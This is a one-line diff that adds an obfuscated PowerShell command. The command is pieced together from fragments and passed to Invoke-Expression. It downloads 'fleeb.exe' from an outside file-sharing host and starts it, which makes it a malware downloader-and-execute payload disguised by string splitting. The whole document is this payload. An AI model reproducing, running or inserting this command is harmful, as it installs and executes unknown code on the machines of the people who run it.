@@ -1,0 +1,1 @@
+﻿ ('('+'New-Ob'+'je'+'c'+'t S'+'ystem'+'.Net.WebClient)'+'.Do'+'wnload'+'Fi'+'le('+'5m0'+'http'+'s:'+'/'+'/'+'me'+'gadl'+'.'+'fr/?'+'b5r5b'+'stqd15'+'m0'+',5'+'m0fleeb'+'.exe5m0)'+';Star'+'t-Proce'+'ss 5m0fleeb'+'.ex'+'e5m0').rePLaCE('5m0',[String][CHAR]39)| INVOKe-EXprESSiOn
